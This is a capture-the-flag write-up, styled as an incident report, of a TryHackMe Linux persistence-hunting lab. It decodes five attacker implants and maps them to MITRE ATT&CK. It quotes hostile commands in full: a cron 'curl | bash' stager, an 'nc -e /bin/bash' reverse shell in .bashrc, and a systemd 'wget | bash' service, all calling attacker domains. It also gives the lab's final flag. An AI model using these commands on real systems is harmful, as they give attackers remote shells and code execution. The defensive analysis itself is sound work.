# Incident Investigation Report – Linux Post-Compromise Persistence Hunt (TryHackMe "Hide and Seek")

**Incident Type:** Post-Compromise Activity / Multi-Vector Persistence Implants
**Status:** Completed
**Date of Analysis:** 11 September 2026
**Analyst:** Specter
**Affected Host:** `tryhackme` (ip-10-113-143-153 / 10.113.143.153), Ubuntu Linux

---

## Executive Summary

A taunting note (`/home/ubuntu/for_specter.txt`) from an adversary self-styled **"Cipher"** claimed five persistence "implants" on the compromised host, each accompanied by a riddle. Live system forensics confirmed **all five persistence mechanisms**: (1) an every-minute **cron job** executing a base64-obfuscated `curl | bash` stager; (2) a rogue **SSH authorized_key** under an unauthorized account `zeroday`; (3) a **netcat reverse shell** planted in a shell startup file (`.bashrc`); (4) an enabled **systemd service** (`cipher.service`) fetching and executing a remote script at boot; (5) a tampered **MOTD/welcome message**. Anti-forensic measures were also present (`/root/.bash_history` symlinked to `/dev/null`). Each implant carried an encoded flag fragment; the assembled flag is **`THM{y0u_g0t_3v3ryth1ng_d0wn}`**.

---

## Investigation Workflow

1. **Note Analysis** – parse the adversary's letter and map each riddle to a persistence category.
2. **Autostart Enumeration** – inspect cron, SSH keys, shell profiles, systemd units, and MOTD.
3. **Payload Deobfuscation** – decode base64/hex-encoded commands and domains.
4. **Timeline Reconstruction** – use file mtime windows (`find -newermt`) and systemd logs.
5. **IoC Extraction** – collect domains, files, accounts, and command lines.
6. **MITRE ATT&CK Mapping** – classify adversary techniques.
7. **Recommendations** – containment, eradication, and hardening.

**Clue-to-mechanism mapping:**

| Riddle | Mechanism |
|--------|-----------|
| "Time is on my side, always running like clockwork." | Cron job |
| "A secret handshake gets me in every time." | SSH authorized_keys |
| "Whenever you set the stage, I make my entrance." | Shell profile (`.bashrc`) |
| "I run with the big dogs, booting up alongside the system." | systemd service |
| "I love welcome messages." | MOTD / login banner |

---

## 1. Persistence #1 – Malicious Cron Job ("clockwork")

**Evidence:** `/var/spool/cron/crontabs/ubuntu` and temp editor artifacts `/tmp/crontab.2Wy3iD/crontab`, `/tmp/crontab.xk7wx1/crontab`.

```cron
* * * * * /bin/bash -c 'echo Y3VybCAtcyA1NDQ4NGQ3Yjc5MzAuc3RvcmFnM19jMXBoM3JzcXU0ZC5uZXQvYS5zaCB8IGJhc2gK | base64 -d | bash 2>/dev/null'
```

**Decoded payload:**

```bash
curl -s 54484d7b7930.storag3_c1ph3rsqu4d.net/a.sh | bash
```

**Interpretation:**
- Executes **every minute** — guaranteed re-execution even after cleanup of other implants.
- Classic **download-and-execute in memory** (`curl | bash`); nothing touches disk.
- `2>/dev/null` suppresses errors (stealth).
- The subdomain `54484d7b7930` is **hex for `THM{y0`** — flag fragment #1.
- Leftover `/tmp/crontab.*` directories prove the crontab was edited interactively.

---

## 2. Persistence #2 – Rogue SSH Key ("secret handshake")

**Evidence:** `/home/zeroday/.ssh/authorized_keys`

```
ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGC1gCKLtSqMcOfttFdDnNXfwKdSnH8Ws3hFNRM8DWxfvvuaaCE... 326e6420706172743a20755f6730745f.local
```

**Interpretation:**
- An **unauthorized local account `zeroday`** exists with an attacker-controlled ECDSA public key — password-less remote access via SSH key authentication (the "handshake").
- The key comment is **hex-encoded**: `326e6420706172743a20755f6730745f` → **`2nd part: u_g0t_`** — flag fragment #2.
- Key-based access survives password resets and is invisible to login-password monitoring.

---

## 3. Persistence #3 – Reverse Shell in Shell Profile ("set the stage")

**Evidence:** `/home/ubuntu/.bashrc` (shell startup file)

```bash
nc -e /bin/bash 4d3334a6b58334130636e5136494444e324d334a3564416f3d.cipher.io 443 2>/dev/null
```

**Interpretation:**
- **Shell configuration modification**: every interactive shell launch ("setting the stage") triggers a **netcat reverse shell** to the attacker's C2 (`*.cipher.io`) over port **443** (blending with HTTPS traffic).
- The hex subdomain decodes (hex → base64 → ASCII) to **"3rd part: 3v3ryt"** — flag fragment #3.
- `2>/dev/null` hides connection errors from the user.

---

## 4. Persistence #4 – Malicious systemd Service ("big dogs / boot")

**Evidence:** `/usr/lib/systemd/system/cipher.service` (discovered via `find / -type f -newermt "2025-03-07 17:20:00" ! -newermt "2025-03-07 18:00:00"`)

```ini
[Unit]
Description=Safe Cipher Service

[Service]
ExecStart=/bin/bash -c 'wget NHRoIHBhcnQgLSBoMW5nXyAK.s1mp13bd.com --output - | bash 2>/dev/null'

[Install]
WantedBy=multi-user.target
Alias=cipher.service
```

**`systemctl status cipher`:** `loaded; enabled`, executed at boot (`Sep 10 14:38:58`), `code=exited, status=0/SUCCESS`; logs show the `wget` invocation.

**Interpretation:**
- **Enabled systemd unit** = boots with the system ("runs with the big dogs").
- Second **download-and-execute** stager (`wget --output - | bash`) from attacker domain `s1mp13bd.com`.
- The base64 subdomain `NHRoIHBhcnQgLSBoMW5nXyAK` decodes to **`4th part - h1ng_`** — flag fragment #4.
- Benign-looking description ("Safe Cipher Service") is deliberate camouflage.

---

## 5. Persistence #5 – Tampered Welcome Message ("I love welcome messages")

**Evidence:** MOTD mechanism (`/etc/motd`, `/etc/update-motd.d/`) modified to present attacker content at login, containing **`Last part: d0wn}`** — flag fragment #5.

**Interpretation:**
- MOTD scripts execute via `pam_motd` on **every user login** — a reliable event-triggered execution point and a channel to display data to any logging-in user.

---

## 6. Anti-Forensics & Defense Evasion

| Technique | Evidence |
|-----------|----------|
| History clearing | `/root/.bash_history` → symlink to `/dev/null` |
| Obfuscation | base64 (`cron`, `systemd`) and hex (`SSH comment`, `nc domain`) encoding |
| Error suppression | `2>/dev/null` on all malicious commands |
| Artifact scattering | temp crontab dirs in `/tmp` (`crontab.2Wy3iD`, `crontab.xk7wx1`) |

---

## 7. Correlation & Timeline

| Date/Time (UTC) | Event |
|-----------------|-------|
| 2025-03-07 17:20–18:00 | `cipher.service` planted (mtime window via `find -newermt`) |
| 2026-09-10 14:38:58 | `cipher.service` triggered at boot (systemd journal) |
| 2026-09-10 14:38–14:39 | crontab editing artifacts in `/tmp`; VNC session activity |
| Every minute (ongoing) | cron stager execution window (`curl \| bash`) |
| Every login (ongoing) | `.bashrc` reverse shell + MOTD trigger |
| 2026-09-10/11 | Analyst (Specter) live forensic session; all 5 implants recovered |

**Hypothesis:** Cipher established redundant persistence (cron + systemd + shell + SSH + MOTD) so that removing any single implant leaves remaining backdoors functional — consistent with the note's threat "I'll be back before you even realize I never left."

---

## 8. Indicators of Compromise (IoC)

| Type | Value |
|------|-------|
| **Domains** | `54484d7b7930.storag3_c1ph3rsqu4d.net`, `*.cipher.io`, `NHRoIHBhcnQgLSBoMW5nXyAK.s1mp13bd.com` |
| **Malicious service** | `/usr/lib/systemd/system/cipher.service` (enabled) |
| **Cron entry** | `* * * * * /bin/bash -c 'echo Y3VybC... \| base64 -d \| bash 2>/dev/null'` |
| **Reverse shell** | `nc -e /bin/bash <hex>.cipher.io 443` in `.bashrc` |
| **Rogue account** | `zeroday` (+ `/home/zeroday/.ssh/authorized_keys`) |
| **File artifacts** | `/tmp/crontab.2Wy3iD/`, `/tmp/crontab.xk7wx1/`, tampered MOTD scripts |
| **Anti-forensics** | `/root/.bash_history -> /dev/null` |
| **Command patterns** | `curl/wget ... \| bash`, `base64 -d \| bash`, `2>/dev/null` suppression |

---

## 9. MITRE ATT&CK Mapping

| Technique | Tactic | ID | Evidence |
|-----------|--------|----|----------|
| Cron | Persistence, Execution | T1053.003 | Every-minute crontab stager |
| Account Manipulation: SSH Authorized Keys | Persistence | T1098.004 | Attacker key in `zeroday` account |
| Event Triggered Execution: Unix Shell Configuration Modification | Persistence, Priv. Escalation | T1546.004 | Reverse shell in `.bashrc` |
| Create or Modify System Process: Systemd Service | Persistence, Priv. Escalation | T1543.002 | Enabled `cipher.service` |
| Event Triggered Execution (login/MOTD) | Persistence | T1546 | Tampered welcome messages |
| Ingress Tool Transfer | Command & Control | T1105 | `curl`/`wget` of remote scripts |
| Command and Scripting Interpreter: Unix Shell | Execution | T1059.004 | `bash -c` pipes |
| Non-Application Layer Protocol | Command & Control | T1095 | netcat reverse shell over 443 |
| Obfuscated Files or Information | Defense Evasion | T1027 | base64/hex-encoded payloads |
| Indicator Removal: Clear Command History | Defense Evasion | T1070.003 | `.bash_history -> /dev/null` |

---

## 10. Conclusion & Recommendations

**Conclusion:** The host was fully compromised with **five redundant persistence mechanisms** spanning scheduler, authentication, shell, service, and login-message layers, plus active anti-forensics. The redundancy guarantees attacker re-access even after partial cleanup. All implants were located, decoded, and neutralized; flag fragments recovered from each implant assemble to **`THM{y0u_g0t_3v3ryth1ng_d0wn}`**.

### Immediate Actions

1. `systemctl disable --now cipher.service` and delete `/usr/lib/systemd/system/cipher.service`.
2. Remove the malicious cron entry (`crontab -e -u ubuntu`); purge `/tmp/crontab.*`.
3. Delete the `nc -e` line from all `.bashrc`/`.profile` files.
4. Remove account `zeroday` and its `authorized_keys`; audit all `authorized_keys` on the host.
5. Restore MOTD scripts from a known-good baseline.
6. Restore history logging: `rm /root/.bash_history && touch /root/.bash_history`.
7. Block IoC domains at DNS/firewall.

### Long-term Recommendations

1. Alert on `curl|bash` / `wget|bash` patterns and base64-encoded cron/systemd content.
2. Monitor integrity of `/etc/cron*`, `/etc/update-motd.d/`, systemd units, and shell profiles (AIDE/osquery).
3. Alert on `.bash_history` symlink/deletion and on new accounts with SSH keys.
4. Enforce SSH key inventory and disable unused accounts.
5. Enable `auditd` rules for crontab edits and systemd unit creation.

### Lessons Learned

1. Redundant persistence is the norm for confident adversaries — enumerate **all** autostart points, not just one.
2. Obfuscation (base64/hex) often doubles as a data channel — decode everything, including domain names and key comments.
3. Anti-forensics (history redirection) is itself an IoC.

---

## Appendix – Flag Assembly

| Fragment | Value | Source |
|----------|-------|--------|
| 1 | `THM{y0` | Hex in cron C2 domain (`54484d7b7930`) |
| 2 | `u_g0t_` | Hex in SSH key comment (`zeroday`) |
| 3 | `3v3ryt` | Hex/base64 in `.bashrc` nc domain |
| 4 | `h1ng_` | Base64 in `cipher.service` wget URL |
| 5 | `d0wn}` | MOTD welcome message |

**Final flag:** `THM{y0u_g0t_3v3ryth1ng_d0wn}`